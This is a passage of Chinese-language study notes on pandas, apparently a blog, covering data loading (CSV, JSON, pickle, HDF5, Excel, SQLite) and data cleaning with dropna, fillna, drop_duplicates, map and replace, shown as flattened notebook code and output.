.dataframe thead th { text-align: right; } AAPL IBM MSFT GOOG Date 2009-12-31 88102700.0 4223400.0 31929700.0 2455400.0 2010-01-04 123432400.0 6155300.0 38409100.0 3937800.0 2010-01-05 150476200.0 6841400.0 49749600.0 6048500.0 2010-01-06 138040000.0 5605300.0 58182400.0 8009000.0 2010-01-07 119282800.0 5840600.0 50559700.0 12912000.0 1returns.corrwith(volume) AAPL -0.061663 IBM -0.156416 MSFT -0.089665 GOOG -0.018289 dtype: float64 1returns.corrwith(returns) AAPL 1.0 IBM 1.0 MSFT 1.0 GOOG 1.0 dtype: float64 传入 axis=&#39;columns&#39; 即可按行进行计算。无论如何，在计算相关系数之前，所有的数据项都会按标签对齐。 唯一值、值计数以及成员资格unique 可以得到Series中的唯一值数组： 12obj = pd.Series(['c', 'a', 'd', 'a', 'a', 'b', 'b', 'c', 'c'])obj.unique() array([&apos;c&apos;, &apos;a&apos;, &apos;d&apos;, &apos;b&apos;], dtype=object) value_counts 用于计算一个 Series 中各值出现的频率： 1obj.value_counts() c 3 a 3 b 2 d 1 dtype: int64 为了便于查看，结果Series是按值频率降序排列的。value_counts还是一个顶级pandas方法，可用于任何数组或序列： 1pd.value_counts(obj.values, sort=False) b 2 d 1 a 3 c 3 dtype: int64 isin用于判断矢量化集合的成员资格，可用于过滤Series中或DataFrame列中数据的子集： 1obj 0 c 1 a 2 d 3 a 4 a 5 b 6 b 7 c 8 c dtype: object 12mask = obj.isin(['b', 'c'])mask 0 True 1 False 2 False 3 False 4 False 5 True 6 True 7 True 8 True dtype: bool 1obj[mask] 0 c 5 b 6 b 7 c 8 c dtype: object 数据加载、存储与文件格式读写文本格式的数据pandas提供了一些用于将表格型数据读取为DataFrame对象的函数。表6-1对它们进行了总结，其中read_csv和read_table可能会是你今后用得最多的。 其中一些函数，比如pandas.read_csv，有类型推断功能，因为列数据的类型不属于数据类型。也就是说，你不需要指定列的类型到底是数值、整数、布尔值，还是字符串。其它的数据格式，如HDF5、Feather和msgpack，会在格式中存储数据类型。 读取 csv 文件1!cat data/examples/ex1.csv a,b,c,d,message 1,2,3,4,hello 5,6,7,8,world 9,10,11,12,foo 由于该文件以逗号分隔，所以我们可以使用read_csv将其读入一个DataFrame： 12df = pd.read_csv('data/examples/ex1.csv')df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 我们还可以使用read_table，并指定分隔符： 1pd.read_table('data/examples/ex1.csv', sep = ',') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 并不是所有文件都有标题行。看看下面这个文件： 1!cat data/examples/ex2.csv 1,2,3,4,hello 5,6,7,8,world 9,10,11,12,foo 读入没有标题行的办法有两个。你可以让pandas为其分配默认的列名，也可以自己定义列名： 1pd.read_csv('data/examples/ex2.csv', header=None) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 3 4 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 1pd.read_csv('data/examples/ex2.csv', names=['a', 'b', 'c', 'd', 'message']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 指定某一列作为列索引 1pd.read_csv('data/examples/ex2.csv', names=['a', 'b', 'c', 'd', 'message'], index_col='message') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message hello 1 2 3 4 world 5 6 7 8 foo 9 10 11 12 如果希望将多个列做成一个层次化索引，只需传入由列编号或列名组成的列表即可： 1!cat data/examples/csv_mindex.csv key1,key2,value1,value2 one,a,1,2 one,b,3,4 one,c,5,6 one,d,7,8 two,a,9,10 two,b,11,12 two,c,13,14 two,d,15,16 1pd.read_csv('data/examples/csv_mindex.csv', index_col=['key1', 'key2']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } value1 value2 key1 key2 one a 1 2 b 3 4 c 5 6 d 7 8 two a 9 10 b 11 12 c 13 14 d 15 16 有些表格可能不是用固定的分隔符去分隔字段的（比如空白符或其它模式）。看看下面这个文本文件： 1list(open('data/examples/ex3.txt')) [&apos; A B C\n&apos;, &apos;aaa -0.264438 -1.026059 -0.619500\n&apos;, &apos;bbb 0.927272 0.302904 -0.032399\n&apos;, &apos;ccc -0.264273 -0.386314 -0.217601\n&apos;, &apos;ddd -0.871858 -0.348382 1.100491\n&apos;] 虽然可以手动对数据进行规整，这里的字段是被数量不同的空白字符间隔开的。这种情况下，你可以传递一个正则表达式作为read_table的分隔符。可以用正则表达式表达为 \s+，于是有： 1pd.read_table('data/examples/ex3.txt', sep='\s+') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } A B C aaa -0.264438 -1.026059 -0.619500 bbb 0.927272 0.302904 -0.032399 ccc -0.264273 -0.386314 -0.217601 ddd -0.871858 -0.348382 1.100491 可以用skiprows跳过文件的第一行、第三行和第四行： 1!cat data/examples/ex4.csv # hey! a,b,c,d,message # just wanted to make things more difficult for you # who reads CSV files with computers, anyway? 1,2,3,4,hello 5,6,7,8,world 9,10,11,12,foo 1pd.read_csv('data/examples/ex4.csv', skiprows=[0, 2, 3]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 缺失值处理是文件解析任务中的一个重要组成部分。缺失数据经常是要么没有（空字符串），要么用某个标记值表示。默认情况下，pandas会用一组经常出现的标记值进行识别，比如NA及NULL： 1!cat data/examples/ex5.csv something,a,b,c,d,message one,1,2,3,4,NA two,5,6,,8,world three,9,10,11,12,foo 1pd.read_csv('data/examples/ex5.csv') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } something a b c d message 0 one 1 2 3.0 4 NaN 1 two 5 6 NaN 8 world 2 three 9 10 11.0 12 foo na_values 可以用一个列表或集合的字符串表示缺失值：(把指定的值填充成 Nan) 12# 把 Null 填充成空缺值pd.read_csv('data/examples/ex5.csv', na_values=['NULL']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } something a b c d message 0 one 1 2 3.0 4 NaN 1 two 5 6 NaN 8 world 2 three 9 10 11.0 12 foo 字典的各列可以对不同的值用NA进行标记： 12sentinels = &#123;'message': ['foo', 'NA'], 'something': ['two']&#125;pd.read_csv('data/examples/ex5.csv', na_values=sentinels) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } something a b c d message 0 one 1 2 3.0 4 NaN 1 NaN 5 6 NaN 8 world 2 three 9 10 11.0 12 NaN pandas.read_csv和pandas.read_table常用的选项。 逐块读取文本文件在处理很大的文件时，或找出大文件中的参数集以便于后续处理时，你可能只想读取文件的一小部分或逐块对文件进行迭代。 在看大文件之前，我们先设置pandas显示地更紧些： 12# 最多显示 10 行pd.options.display.max_rows = 10 1pd.read_csv('data/examples/ex6.csv') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four key 0 0.467976 -0.038649 -0.295344 -1.824726 L 1 -0.358893 1.404453 0.704965 -0.200638 B 2 -0.501840 0.659254 -0.421691 -0.057688 G 3 0.204886 1.074134 1.388361 -0.982404 R 4 0.354628 -0.133116 0.283763 -0.837063 Q ... ... ... ... ... ... 9995 2.311896 -0.417070 -1.409599 -0.515821 L 9996 -0.479893 -0.650419 0.745152 -0.646038 E 9997 0.523331 0.787112 0.486066 1.093156 K 9998 -0.362559 0.598894 -1.843201 0.887292 G 9999 -0.096376 -1.012999 -0.657431 -0.573315 0 10000 rows × 5 columns 如果只想读取几行（避免读取整个文件），通过nrows进行指定即可： 1pd.read_csv('data/examples/ex6.csv', nrows=5) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } one two three four key 0 0.467976 -0.038649 -0.295344 -1.824726 L 1 -0.358893 1.404453 0.704965 -0.200638 B 2 -0.501840 0.659254 -0.421691 -0.057688 G 3 0.204886 1.074134 1.388361 -0.982404 R 4 0.354628 -0.133116 0.283763 -0.837063 Q 要逐块读取文件，可以指定chunksize（行数）： 12chunker = pd.read_csv('data/examples/ex6.csv', chunksize=2)chunker &lt;pandas.io.parsers.TextFileReader at 0xa1a9710&gt; 1234tot = pd.Series([])for piece in chunker: tot = tot.add(piece['key'].value_counts(), fill_value=0)print(piece) one two three four key 9998 -0.362559 0.598894 -1.843201 0.887292 G 9999 -0.096376 -1.012999 -0.657431 -0.573315 0 将数据写出到文本格式12data = pd.read_csv('data/examples/ex5.csv')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } something a b c d message 0 one 1 2 3.0 4 NaN 1 two 5 6 NaN 8 world 2 three 9 10 11.0 12 foo 12# 输出到文件data.to_csv('data/examples/out.csv') 1!cat data/examples/out.csv ,something,a,b,c,d,message 0,one,1,2,3.0,4, 1,two,5,6,,8,world 2,three,9,10,11.0,12,foo 当然，还可以使用其他分隔符（由于这里直接写出到sys.stdout，所以仅仅是打印出文本结果而已）： 1import sys 12# 设置分割符 |data.to_csv(sys.stdout, sep='|') |something|a|b|c|d|message 0|one|1|2|3.0|4| 1|two|5|6||8|world 2|three|9|10|11.0|12|foo 禁止输出行和列的标签(索引) 1data.to_csv(sys.stdout, index=False, header=False) one,1,2,3.0,4, two,5,6,,8,world three,9,10,11.0,12,foo 输出部分列 1data.to_csv(sys.stdout, index=False, columns=['a', 'b', 'c']) a,b,c 1,2,3.0 5,6, 9,10,11.0 JSON数据123456789101112obj = """&#123;"name": "Wes", "places_lived": ["United States", "Spain", "Germany"], "pet": null, "siblings": [&#123;"name": "Scott", "age": 30, "pets": ["Zeus", "Zuko"]&#125;, &#123;"name": "Katie", "age": 38, "pets": ["Sixes", "Stache", "Cisco"]&#125;]&#125;"""import jsonresult = json.loads(obj)result {&apos;name&apos;: &apos;Wes&apos;, &apos;places_lived&apos;: [&apos;United States&apos;, &apos;Spain&apos;, &apos;Germany&apos;], &apos;pet&apos;: None, &apos;siblings&apos;: [{&apos;name&apos;: &apos;Scott&apos;, &apos;age&apos;: 30, &apos;pets&apos;: [&apos;Zeus&apos;, &apos;Zuko&apos;]}, {&apos;name&apos;: &apos;Katie&apos;, &apos;age&apos;: 38, &apos;pets&apos;: [&apos;Sixes&apos;, &apos;Stache&apos;, &apos;Cisco&apos;]}]} 12siblings = pd.DataFrame(result['siblings'], columns=['name', 'age'])siblings .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age 0 Scott 30 1 Katie 38 pandas.read_json可以自动将特别格式的JSON数据集转换为Series或DataFrame。例如： 1!cat data/examples/example.json [{&quot;a&quot;: 1, &quot;b&quot;: 2, &quot;c&quot;: 3}, {&quot;a&quot;: 4, &quot;b&quot;: 5, &quot;c&quot;: 6}, {&quot;a&quot;: 7, &quot;b&quot;: 8, &quot;c&quot;: 9}] 12data = pd.read_json('data/examples/example.json')data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c 0 1 2 3 1 4 5 6 2 7 8 9 将数据从pandas输出到JSON，可以使用to_json方法： 1data.to_json() &apos;{&quot;a&quot;:{&quot;0&quot;:1,&quot;1&quot;:4,&quot;2&quot;:7},&quot;b&quot;:{&quot;0&quot;:2,&quot;1&quot;:5,&quot;2&quot;:8},&quot;c&quot;:{&quot;0&quot;:3,&quot;1&quot;:6,&quot;2&quot;:9}}&apos; 1data.to_json(orient='records') &apos;[{&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3},{&quot;a&quot;:4,&quot;b&quot;:5,&quot;c&quot;:6},{&quot;a&quot;:7,&quot;b&quot;:8,&quot;c&quot;:9}]&apos; 二进制数据格式实现数据的高效二进制格式存储最简单的办法之一是使用Python内置的pickle序列化。pandas对象都有一个用于将数据以pickle格式保存到磁盘上的to_pickle方法： 12frame = pd.read_csv('data/examples/ex1.csv')frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 1frame.to_pickle('data/examples/frame_pickle') 通过pickle直接读取被pickle化的数据，或是使用更为方便的pandas.read_pickle： 1pd.read_pickle('data/examples/frame_pickle') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d message 0 1 2 3 4 hello 1 5 6 7 8 world 2 9 10 11 12 foo 注意：pickle仅建议用于短期存储格式。其原因是很难保证该格式永远是稳定的；今天pickle的对象可能无法被后续版本的库unpickle出来。虽然我尽力保证这种事情不会发生在pandas中，但是今后的某个时候说不定还是得“打破”该pickle格式。 使用HDF5格式HDF5是一种存储大规模科学数组数据的非常好的文件格式。它可以被作为C标准库，带有许多语言的接口，如Java、Python和MATLAB等。HDF5中的HDF指的是层次型数据格式（hierarchical data format）。每个HDF5文件都含有一个文件系统式的节点结构，它使你能够存储多个数据集并支持元数据。与其他简单格式相比，HDF5支持多种压缩器的即时压缩，还能更高效地存储重复模式数据。对于那些非常大的无法直接放入内存的数据集，HDF5就是不错的选择，因为它可以高效地分块读写。 虽然可以用PyTables或h5py库直接访问HDF5文件，pandas提供了更为高级的接口，可以简化存储Series和DataFrame对象。HDFStore类可以像字典一样，处理低级的细节： 12frame = pd.DataFrame(&#123;'a': np.random.randn(100)&#125;)frame.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a 0 1.863684 1 0.743116 2 -0.656781 3 0.349087 4 -0.772184 1store = pd.HDFStore('data/examples/mydata.h5') 12# 存储数据store['obj1'] = frame 1store['obj1_col'] = frame['a'] 1store &lt;class &apos;pandas.io.pytables.HDFStore&apos;&gt; File path: data/examples/mydata.h5 1store.close() 1store1 = pd.HDFStore('data/examples/mydata.h5') 12# 获取数据store1['obj1'].head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a 0 1.863684 1 0.743116 2 -0.656781 3 0.349087 4 -0.772184 读取Microsoft Excel文件pandas的ExcelFile类或pandas.read_excel函数支持读取存储在Excel 2003（或更高版本）中的表格型数据。这两个工具分别使用扩展包xlrd和openpyxl读取XLS和XLSX文件。你可以用pip或conda安装它们。 12xlsx = pd.ExcelFile('data/examples/ex1.xlsx')pd.read_excel(xlsx, 'Sheet1') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Unnamed: 0 a b c d message 0 0 1 2 3 4 hello 1 1 5 6 7 8 world 2 2 9 10 11 12 foo 如果要读取一个文件中的多个表单，创建ExcelFile会更快，但你也可以将文件名传递到pandas.read_excel： 12frame = pd.read_excel('data/examples/ex1.xlsx', 'Sheet1')frame .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } Unnamed: 0 a b c d message 0 0 1 2 3 4 hello 1 1 5 6 7 8 world 2 2 9 10 11 12 foo 如果要将pandas数据写入为Excel格式，你必须首先创建一个ExcelWriter，然后使用pandas对象的to_excel方法将数据写入到其中： 123writer = pd.ExcelWriter('data/examples/ex2.xlsx')frame.to_excel(writer, 'Sheet1')writer.save() 你还可以不使用ExcelWriter，而是传递文件的路径到to_excel： 1frame.to_excel('data/examples/ex2.xlsx') 数据库交互将数据从SQL加载到DataFrame的过程很简单，此外pandas还有一些能够简化该过程的函数。例如，我将使用SQLite数据库（通过Python内置的sqlite3驱动器）： 123456789101112131415161718192021222324import sqlite3# 创建表query = """CREATE TABLE test(a VARCHAR(20), b VARCHAR(20), c REAL, d INTEGER);"""con = sqlite3.connect('mydata.sqlite')con.execute(query)con.commit()# 写入数据 批量写入data = [('Atlanta', 'Georgia', 1.25, 6),('Tallahassee', 'Florida', 2.6, 3),('Sacramento', 'California', 1.7, 5)]stmt = "INSERT INTO test VALUES(?, ?, ?, ?)"con.executemany(stmt, data)con.commit()# 查询数据cursor = con.execute('select * from test')rows = cursor.fetchall()rows [(&apos;Atlanta&apos;, &apos;Georgia&apos;, 1.25, 6), (&apos;Tallahassee&apos;, &apos;Florida&apos;, 2.6, 3), (&apos;Sacramento&apos;, &apos;California&apos;, 1.7, 5)] 12# 获取列名(字段名称)cursor.description ((&apos;a&apos;, None, None, None, None, None, None), (&apos;b&apos;, None, None, None, None, None, None), (&apos;c&apos;, None, None, None, None, None, None), (&apos;d&apos;, None, None, None, None, None, None)) 12# 创建 dataframepd.DataFrame(rows, columns=[x[0] for x in cursor.description]) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 Atlanta Georgia 1.25 6 1 Tallahassee Florida 2.60 3 2 Sacramento California 1.70 5 pandas 有一个 read_sql 函数，可以直接通过 sql 进行读取数据 1db = sqlite3.connect('mydata.sqlite') 1pd.read_sql('select * from test', db) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 Atlanta Georgia 1.25 6 1 Tallahassee Florida 2.60 3 2 Sacramento California 1.70 5 数据清洗和准备处理缺失数据缺失数据在pandas中呈现的方式有些不完美，但对于大多数用户可以保证功能正常。对于数值数据，pandas使用浮点值NaN（Not a Number）表示缺失数据。我们称其为哨兵值，可以方便的检测出来： 12string_data = pd.Series(['aardvark', 'artichoke', np.nan, 'avocado'])string_data 0 aardvark 1 artichoke 2 NaN 3 avocado dtype: object 12# 判断是否是空值string_data.isnull() 0 False 1 False 2 True 3 False dtype: bool Python内置的None值在对象数组中也可以作为NA 12string_data[0] = Nonestring_data 0 None 1 artichoke 2 NaN 3 avocado dtype: object 1string_data.isnull() 0 True 1 False 2 True 3 False dtype: bool 一些关于缺失数据处理的函数。 滤除缺失数据对于一个Series，dropna返回一个仅含非空数据和索引值的Series： 12data = pd.Series([1, np.nan, 3.5, np.nan, 7])data 0 1.0 1 NaN 2 3.5 3 NaN 4 7.0 dtype: float64 1data.dropna() 0 1.0 2 3.5 4 7.0 dtype: float64 12# 等价于data[data.notnull()] 0 1.0 2 3.5 4 7.0 dtype: float64 而对于DataFrame对象，事情就有点复杂了。你可能希望丢弃全NA或含有NA的行或列。dropna默认丢弃任何含有缺失值的行： 12data = pd.DataFrame([[1., 6.5, 3.], [1., NA, NA], [NA, NA, NA], [NA, 6.5, 3.]])data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 1.0 6.5 3.0 1 1.0 NaN NaN 2 NaN NaN NaN 3 NaN 6.5 3.0 1data.dropna() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 1.0 6.5 3.0 传入 how=&#39;all&#39; 将只丢弃全为NA的那些行： 1data.dropna(how='all') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 1.0 6.5 3.0 1 1.0 NaN NaN 3 NaN 6.5 3.0 丢弃列，只需传入axis=1即可： 12data[4] = NAdata .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 4 0 1.0 6.5 3.0 NaN 1 1.0 NaN NaN NaN 2 NaN NaN NaN NaN 3 NaN 6.5 3.0 NaN 1data.dropna(axis=1, how='all') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 1.0 6.5 3.0 1 1.0 NaN NaN 2 NaN NaN NaN 3 NaN 6.5 3.0 thresh 参数 删除 行、列 空值超过指定数字的 1data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 4 0 1.0 6.5 3.0 NaN 1 1.0 NaN NaN NaN 2 NaN NaN NaN NaN 3 NaN 6.5 3.0 NaN 12# 删除 行 方向 nan 大于 2 的行data.dropna(thresh=2) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 4 0 1.0 6.5 3.0 NaN 3 NaN 6.5 3.0 NaN 填充缺失数据对于大多数情况而言，fillna方法是最主要的函数。通过一个常数调用fillna就会将缺失值替换为那个常数值： 1234df = pd.DataFrame(np.random.randn(7, 3))df.iloc[:4, 1] = NAdf.iloc[:2, 2] = NAdf .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 0.187550 NaN NaN 1 -0.903578 NaN NaN 2 0.142988 NaN -1.629844 3 0.346151 NaN -0.806237 4 0.125914 -0.188009 -1.067930 5 -1.181948 0.289074 -0.852676 6 0.568097 -0.950069 -2.165337 12# 填充成 0df.fillna(0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 0.187550 0.000000 0.000000 1 -0.903578 0.000000 0.000000 2 0.142988 0.000000 -1.629844 3 0.346151 0.000000 -0.806237 4 0.125914 -0.188009 -1.067930 5 -1.181948 0.289074 -0.852676 6 0.568097 -0.950069 -2.165337 若是通过一个字典调用fillna，就可以实现对不同的列填充不同的值： 12# 1 列填充 0.5 ；2 列填充 0df.fillna(&#123;1: 0.5, 2: 0&#125;) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 0.187550 0.500000 0.000000 1 -0.903578 0.500000 0.000000 2 0.142988 0.500000 -1.629844 3 0.346151 0.500000 -0.806237 4 0.125914 -0.188009 -1.067930 5 -1.181948 0.289074 -0.852676 6 0.568097 -0.950069 -2.165337 fillna默认会返回新对象，但也可以对现有对象进行就地修改： 12df.fillna(0, inplace=True)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 0.187550 0.000000 0.000000 1 -0.903578 0.000000 0.000000 2 0.142988 0.000000 -1.629844 3 0.346151 0.000000 -0.806237 4 0.125914 -0.188009 -1.067930 5 -1.181948 0.289074 -0.852676 6 0.568097 -0.950069 -2.165337 对 reindex 有效的那些插值方法也可用于fillna： 1234df = pd.DataFrame(np.random.randn(6, 3))df.iloc[2:, 1] = NAdf.iloc[4:, 2] = NAdf .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 -2.190504 -1.963825 -1.545763 1 0.306294 -1.290580 -1.274680 2 0.535840 NaN 0.219375 3 0.938590 NaN -1.277384 4 0.747602 NaN NaN 5 -0.113758 NaN NaN 12# ffill 使用 前值填充df.fillna(method='ffill') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 -2.190504 -1.963825 -1.545763 1 0.306294 -1.290580 -1.274680 2 0.535840 -1.290580 0.219375 3 0.938590 -1.290580 -1.277384 4 0.747602 -1.290580 -1.277384 5 -0.113758 -1.290580 -1.277384 12# limit 限制填充的条数df.fillna(method='ffill', limit=2) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1 2 0 -2.190504 -1.963825 -1.545763 1 0.306294 -1.290580 -1.274680 2 0.535840 -1.290580 0.219375 3 0.938590 -1.290580 -1.277384 4 0.747602 NaN -1.277384 5 -0.113758 NaN -1.277384 可以传入Series的平均值或中位数： 12data = pd.Series([1., NA, 3.5, NA, 7])data 0 1.0 1 NaN 2 3.5 3 NaN 4 7.0 dtype: float64 1data.fillna(data.mean()) 0 1.000000 1 3.833333 2 3.500000 3 3.833333 4 7.000000 dtype: float64 fillna函数参数 数据转换移除重复数据12data = pd.DataFrame(&#123;'k1': ['one', 'two'] * 3 + ['two'], 'k2': [1, 1, 2, 3, 3, 4, 4]&#125;)data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } k1 k2 0 one 1 1 two 1 2 one 2 3 two 3 4 one 3 5 two 4 6 two 4 duplicated 方法返回一个布尔型 Series，表示各行是否是重复行（前面出现过的行）： 1data.duplicated() 0 False 1 False 2 False 3 False 4 False 5 False 6 True dtype: bool drop_duplicates 方法，它会返回一个DataFrame，重复的数据会被删除 1data.drop_duplicates() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } k1 k2 0 one 1 1 two 1 2 one 2 3 two 3 4 one 3 5 two 4 这两个方法默认会判断全部列，你也可以指定部分列进行重复项判断。 1data.drop_duplicates(['k1']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } k1 k2 0 one 1 1 two 1 duplicated 和 drop_duplicates 默认保留的是第一个出现的值组合。传入 keep=&#39;last&#39; 则保留最后一个： 1data.drop_duplicates(['k1', 'k2'], keep='last') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } k1 k2 0 one 1 1 two 1 2 one 2 3 two 3 4 one 3 6 two 4 利用函数或映射进行数据转换 利用函数或映射进行数据转换我们来看看下面这组有关肉类的数据： 123data = pd.DataFrame(&#123;'food': ['bacon', 'pulled pork', 'bacon', 'Pastrami', 'corned beef', 'Bacon','pastrami', 'honey ham', 'nova lox'], 'ounces': [4, 3, 12, 6, 7.5, 8, 3, 5, 6]&#125;)data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } food ounces 0 bacon 4.0 1 pulled pork 3.0 2 bacon 12.0 3 Pastrami 6.0 4 corned beef 7.5 5 Bacon 8.0 6 pastrami 3.0 7 honey ham 5.0 8 nova lox 6.0 假设你想要添加一列表示该肉类食物来源的动物类型。我们先编写一个不同肉类到动物的映射： 12345678meat_to_animal = &#123; 'bacon': 'pig', 'pulled pork': 'pig', 'pastrami': 'cow', 'corned beef': 'cow', 'honey ham': 'pig', 'nova lox': 'salmon'&#125; 列字符转换成小写 12lowercased = data['food'].str.lower()lowercased 0 bacon 1 pulled pork 2 bacon 3 pastrami 4 corned beef 5 bacon 6 pastrami 7 honey ham 8 nova lox Name: food, dtype: object 1lowercased.map(meat_to_animal) 0 pig 1 pig 2 pig 3 cow 4 cow 5 pig 6 cow 7 pig 8 salmon Name: food, dtype: object 12data['animal'] = lowercased.map(meat_to_animal)data .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } food ounces animal 0 bacon 4.0 pig 1 pulled pork 3.0 pig 2 bacon 12.0 pig 3 Pastrami 6.0 cow 4 corned beef 7.5 cow 5 Bacon 8.0 pig 6 pastrami 3.0 cow 7 honey ham 5.0 pig 8 nova lox 6.0 salmon 我们也可以使用下面的这种方式 1data['food'].map(lambda x: meat_to_animal[x.lower()]) 0 pig 1 pig 2 pig 3 cow 4 cow 5 pig 6 cow 7 pig 8 salmon Name: food, dtype: object 替换值12data = pd.Series([1., -999., 2., -999., -1000., 3.])data 0 1.0 1 -999.0 2 2.0 3 -999.0 4 -1000.0 5 3.0 dtype: float64 -999这个值可能是一个表示缺失数据的标记值。要将其替换为pandas能够理解的NA值，我们可以利用replace来产生一个新的Series（除非传入inplace=True）： 1data.replace(-999, np.nan) 0 1.0 1 NaN 2 2.0 3 NaN 4 -1000.0 5 3.0 dtype: float64 如果你希望一次性替换多个值，可以传入一个由待替换值组成的列表以及一个替换值： 1data.replace([-999, -1000], np.nan) 0 1.0 1 NaN 2 2.0 3 NaN 4 NaN 5 3.0 dtype: float64 要让每个值有不同的替换值，可以传递一个替换列表： 1data.replace([-999, -1000], [np.nan, 0]) 0 1.0 1 NaN 2 2.0 3 NaN 4 0.0 5 3.0 dtype: float64 传入的参数也可以是字典： 1data.replace(&#123;-999: np.nan, -1000: 0&#125;) 0 1.0 1 NaN 2 2.0 3 NaN 4 0.0 5 3.0 dtype: float64 重命名轴索引12data = pd.DataFrame(np.arange(12).reshape((3, 4)), index=['Ohio', 'Colorado', 